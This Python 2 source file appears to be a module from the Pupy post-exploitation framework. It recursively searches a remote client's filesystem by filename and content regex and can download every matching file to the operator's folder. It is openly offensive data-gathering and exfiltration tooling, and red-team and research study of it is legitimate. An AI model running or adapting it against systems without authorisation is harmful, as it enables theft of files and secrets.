# -*- coding: utf-8 -*-
from pupylib.PupyModule import *
import os
from pupylib.utils.term import colorize
from rpyc.utils.classic import download

__class_name__="SearchModule"

@config(cat="gather")
class SearchModule(PupyModule):
    """ walk through a directory and recursively search a string into files """
    dependencies = [ 'pupyutils.search', 'scandir' ]

    terminate = None

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="search", description=self.__doc__)
        self.arg_parser.add_argument('-p', '--path', default='.', help='root path to start (default: current path)')
        self.arg_parser.add_argument('-m','--max-size', type=int, default=20000000, help='max file size (default 20 Mo)')
        self.arg_parser.add_argument('-b', '--binary', action='store_true', help='search content inside binary files')
        self.arg_parser.add_argument('-L', '--links', action='store_true', help='follow symlinks')
        self.arg_parser.add_argument('-D', '--download', action='store_true', help='download found files (imply -N)')
        self.arg_parser.add_argument('-N', '--no-content', action='store_true', help='if string matches, output just filename')
        self.arg_parser.add_argument('filename', type=str, metavar='filename', help='regex to search (filename)')
        self.arg_parser.add_argument('strings', nargs='*', default=[], type=str,
                                         metavar='string', help='regex to search (content)')

    def run(self, args):
        self.terminate = self.client.conn.modules['threading'].Event()

        if args.download:
            args.no_content = True

        s = self.client.conn.modules['pupyutils.search'].Search(
            args.filename,
            strings=args.strings,
            max_size=args.max_size,
            root_path=args.path,
            follow_symlinks=args.links,
            no_content=args.no_content,
            terminate=self.terminate
        )

        download_folder = None
        ros = None

        if args.download:
            config = self.client.pupsrv.config or PupyConfig()
            download_folder = config.get_folder('searches', {'%c': self.client.short_name()})
            ros = self.client.conn.modules['os']

        for res in s.run():
            if args.strings and not args.no_content:
                self.success('{}: {}'.format(*res))
            else:
                if args.download and download is not None and ros is not None:
                    dest = res.replace('!', '!!').replace('/', '!').replace('\\', '!')
                    dest = os.path.join(download_folder, dest)
                    try:
                        size = ros.path.getsize(res)
                        download(
                            self.client.conn,
                            res,
                            dest,
                            chunk_size=min(size, 8*1024*1024))
                        self.success('{} -> {} ({})'.format(res, dest, size))
                    except Exception, e:
                        self.error('{} -> {}: {}'.format(res, dest, e))
                else:
                    self.success('{}'.format(res))

            if self.terminate.is_set():
                break

        self.info("complete")

    def interrupt(self):
        if self.terminate:
            self.terminate.set()
